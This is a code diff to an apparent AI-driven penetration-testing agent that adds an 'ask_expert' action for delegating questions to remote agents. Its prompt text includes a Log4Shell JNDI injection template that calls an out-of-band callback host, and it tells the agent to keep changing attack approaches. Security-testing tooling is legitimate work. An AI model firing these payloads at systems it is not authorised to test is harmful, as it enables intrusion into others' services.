@@ -9,6 +9,7 @@
 AI Agent 调度器 - ReAct循环版（路径A核心）- 优化版
 包含：Plan-and-Execute 计划模式
 """
+import asyncio
 import json
 import re
 import time
@@ -201,6 +202,8 @@ class ReActAgent:
         self._strategy_switched = 0
         # Z3.4: OOB 盲打假设验证去重（target|param|payload 模板），每假设只打一次
         self._oob_attempted: set = set()
+        # 外询专家去重：同一问题只委派一次，控制开销与外部调用次数
+        self._expert_asked: set = set()
 
     def _ensure_shared_knowledge(self) -> Dict:
         shared = getattr(self.context, self._shared_knowledge_key, None)
@@ -536,8 +539,9 @@ class ReActAgent:
 【可用工具（共{len(self.tools)}个）】
 {self._format_tools()}
 
-【特殊动作（Z3.4 盲打假设验证）】
+【特殊动作（Z3.4 盲打假设验证 + 外询专家）】
 oob_confirm(url,param,payload,timeout)：规则引擎全 miss 的无回显假设验证——注入带外地址并轮询回调，回调=Critical 实锤。payload 为载荷模板，用 {{{{OBS_DNS}}}}（DNS 外带）或 {{{{OBS_HTTP}}}}（HTTP 外带）占位，例如 ${{jndi:ldap://{{{{OBS_DNS}}}}/a}}、http://{{{{OBS_DNS}}}}/probe。适合 log4shell/fastjson/struts2-ognl/ssrf/xxe 等盲打场景。
+ask_expert(question,context,system)：困惑时外询——内部知识盲区/判断依据不足时（未知漏洞类型、载荷不确定、技术栈陌生、证据难解释），把问题委派给已配置的外部 Agent 拿第二意见。只传分析所需文本，禁止传密钥/OOB token/本地路径；外部不可用会自动降级回本地，不影响流程。
 
 请思考：
 1. 当前最有价值的攻击面是什么？
@@ -627,11 +631,12 @@ oob_confirm(url,param,payload,timeout)：规则引擎全 miss 的无回显假设
 
 【策略状态（A1.3 反思循环）】
 连续失败 {self._consecutive_failures} 次，累计切换策略 {self._strategy_switched} 次。
-{'⚠️ 连续失败≥2次，必须更换工具/参数/攻击思路，禁止重试相同动作。' if self._consecutive_failures >= 2 else '可继续当前策略。'}
+{'⚠️ 连续失败≥2次，必须更换工具/参数/攻击思路，禁止重试相同动作；若判断依据不足，可调用 ask_expert 咨询外部专家。' if self._consecutive_failures >= 2 else '可继续当前策略。'}
 
 【可用工具】
 {chr(10).join(tools_desc)}
 - oob_confirm(score=0.95)(url,param,payload,timeout): Z3.4 无回显盲打假设验证——注入带外地址轮询回调，回调=Critical 实锤。payload 模板含 {{{{OBS_DNS}}}}/{{{{OBS_HTTP}}}} 占位。规则引擎全 miss 时对 log4shell/fastjson/ssrf/xxe 等盲打使用（可作 current_action）。
+- ask_expert(score=0.8)(question,context): 困惑时外询——知识盲区/判断依据不足时委派外部 Agent 拿第二意见（REMOTE_AGENTS 未配置则自动降级）。只传分析文本，禁止密钥/OOB token/路径。
 
 【当前状态】
 - 已发现漏洞: {len(self.findings)}
@@ -778,6 +783,12 @@ oob_confirm(url,param,payload,timeout)：规则引擎全 miss 的无回显假设
         # 不注册进 TOOL_REGISTRY，避免与工具层改动冲突；由 Agent 按需调用。
         if tool_name == "oob_confirm":
             return await self._execute_oob_confirm(params)
+
+        # 困惑时外询：内部 Agent 保持精简稳定，遇知识盲区/判断依据不足时
+        # 委派给已配置的外部 Agent（REMOTE_AGENTS）当第二意见。
+        # 同样为内置动作（非 TOOL_REGISTRY），未配置/全失败自动降级回本地逻辑。
+        if tool_name == "ask_expert":
+            return await self._execute_ask_expert(params)
 
         if tool_name not in self.tools:
             logger.warning(f"⚠️ 未知工具: {tool_name}")
@@ -932,6 +943,59 @@ oob_confirm(url,param,payload,timeout)：规则引擎全 miss 的无回显假设
         logger.info(f"✅ [OOBConfirm] token={token} 回调实锤 → Critical")
         return finding
 
+    async def _execute_ask_expert(self, params: Dict) -> Dict:
+        """困惑时外询：内部 Agent 保持精简稳定，遇知识盲区/判断依据不足时，
+        把问题委派给已配置的外部 Agent（REMOTE_AGENTS）当第二意见。
+
+        参数（LLM 调用）：
+          question  : 要咨询的问题（必填）
+          system    : 可选，外部 Agent 的角色/system 提示
+          context   : 可选，附加上下文（技术栈/已观察现象），会拼进问题
+          max_tokens: 可选，外部回答长度上限（默认 800）
+
+        安全与降级：
+          - 只传分析所需文本，question 里禁止密钥/OOB token/本地路径（prompt 层已约束）
+          - 未配置 REMOTE_AGENTS / 全部委派失败 / 超时 → 返回 None 语义，不影响主流程
+          - 同一问题去重，只委派一次，控制外部调用成本
+        """
+        question = str(params.get("question", "") or "").strip()
+        if not question:
+            return {"error": "ask_expert 需要 question 参数"}
+
+        dedup_key = question[:120]
+        if dedup_key in self._expert_asked:
+            return {"info": f"该问题已咨询过外部专家，跳过（{dedup_key[:60]}）", "dedup": True}
+        self._expert_asked.add(dedup_key)
+
+        system = str(params.get("system", "") or "你是渗透测试领域专家，给出简洁、可执行的判断与建议。")
+        context = str(params.get("context", "") or "")
+        max_tokens = int(params.get("max_tokens", 800) or 800)
+
+        try:
+            from vulnclaw.ai.remote_agents import delegate_analysis
+        except Exception as exc:
+            logger.debug(f"[外询] remote_agents 导入失败，回退本地逻辑: {exc}")
+            return {"info": "外部专家不可用，按本地经验继续", "type": "expert_unavailable"}
+
+        prompt = f"【附加上下文】\n{context}\n\n【问题】\n{question}" if context else question
+        try:
+            answer = await asyncio.wait_for(
+                delegate_analysis(prompt, system=system, max_tokens=max_tokens), timeout=25
+            )
+        except asyncio.TimeoutError:
+            logger.warning("[外询] 外部专家超时（25s），回退本地逻辑")
+            return {"info": "外部专家超时，按本地经验继续", "type": "expert_unavailable"}
+        if not answer:
+            logger.info("[外询] 外部专家不可用（未配置 REMOTE_AGENTS 或全部熔断），回退本地逻辑")
+            return {"info": "外部专家不可用，按本地经验继续", "type": "expert_unavailable"}
+        logger.info(f"[外询] 外部专家返回 {len(answer)} 字")
+        return {
+            "type": "expert_advice",
+            "answer": answer,
+            "question": question[:120],
+            "source": "remote_agent",
+        }
+
     async def _verify_action(self, action: Dict, result: Any) -> bool:
         if not result or isinstance(result, Exception):
             return False
@@ -1000,6 +1064,12 @@ oob_confirm(url,param,payload,timeout)：规则引擎全 miss 的无回显假设
                     self.findings.extend(result[key])
                     self._publish_blackboard({"vulns": result[key]})
                     return {"type": "findings", "message": f"在 {key} 检测中发现漏洞", "data": result[key]}
+
+            # 外询专家意见：写入黑板 notes 供各子 Agent 共享，作为下轮决策依据
+            if result.get("type") == "expert_advice":
+                answer = str(result.get("answer", ""))
+                self._publish_blackboard({"notes": {"expert_advice": answer[:500]}})
+                return {"type": "expert_advice", "message": f"外部专家意见: {answer[:200]}", "data": result}
 
             return {"type": "info", "message": "工具执行完成，无异常发现", "data": result}
 
@@ -1168,7 +1238,7 @@ oob_confirm(url,param,payload,timeout)：规则引擎全 miss 的无回显假设
             for key, value in (payload or {}).items():
                 self.blackboard.publish(key, value)
         except Exception:  # noqa: BLE001
-            pass
+            logger.debug("suppressed exception (core audit)")
 
     # ---------------- A4: 上下文管理 ----------------
     def _global_context(self) -> str:
